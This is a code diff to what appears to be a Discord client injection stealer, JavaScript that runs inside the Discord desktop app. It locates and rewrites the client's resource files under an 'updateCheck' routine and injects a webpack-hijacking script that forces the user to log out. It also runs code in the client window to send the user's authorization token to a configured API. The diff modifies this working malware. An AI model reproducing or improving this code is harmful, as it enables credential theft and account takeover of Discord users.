@@ -73,19 +73,22 @@ const config = {
 const [LOGOUT_SCRIPT] = ["window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[[\"get_require\"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b=\"string\"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})(\"login\").logout()}LogOut();"];
 
 const discordPath = (function () {
-  const appFolders = fs.readdirSync(args[0]).filter(folder => folder.startsWith("app-"));
-  const targetAppFolder = appFolders.find(folder => folder.startsWith("app-"));
-  if (!targetAppFolder) return { undefined, undefined };
-  const appDirectory = path.join(args[0], targetAppFolder);
-  const resourcePath = path.join(appDirectory, 'resources');
-  
-  if (fs.existsSync(resourcePath)) return { resourcePath, appDirectory };
+  const app = args[0].split(path.sep).slice(0, -1).join(path.sep);
+  let resourcePath;
+
+  if (process.platform === 'win32') {
+    resourcePath = path.join(app, 'resources');
+  } else if (process.platform === 'darwin') {
+    resourcePath = path.join(app, 'Contents', 'Resources');
+  }
+
+  if (fs.existsSync(resourcePath)) return { resourcePath, app };
   return { undefined, undefined };
 })();
 
 async function updateCheck() {
-  const { resourcePath, appDirectory } = discordPath;
-  if (resourcePath === undefined || appDirectory === undefined) return;
+  const { resourcePath, app } = discordPath;
+  if (resourcePath === undefined || app === undefined) return;
   const appPath = path.join(resourcePath, 'app');
   const packageJson = path.join(appPath, 'package.json');
   const resourceIndex = path.join(appPath, 'index.js');
@@ -125,22 +128,16 @@ async function updateCheck() {
   return !1;
 };
 
-
-
 const wwww = async () => {
   await BrowserWindow.getAllWindows()[0]?.webContents.executeJavaScript(LOGOUT_SCRIPT, true);
 };
 
 const getInfo = async (token) => {
   const info = await BrowserWindow.getAllWindows()[0]?.webContents.executeJavaScript(`var xmlHttp = new XMLHttpRequest();
-  xmlHttp.open("GET", "${config.api}", true);
+  xmlHttp.open("GET", "${config.api}", false);
   xmlHttp.setRequestHeader("Authorization", "${token}");
-  xmlHttp.onreadystatechange = function() {
-    if (xmlHttp.readyState == 4 && xmlHttp.status == 200) {
-      console.log(xmlHttp.responseText);
-    }
-  };
-  xmlHttp.send();`);
+  xmlHttp.send(null);
+  xmlHttp.responseText;`);
   return JSON.parse(info);
 };
 
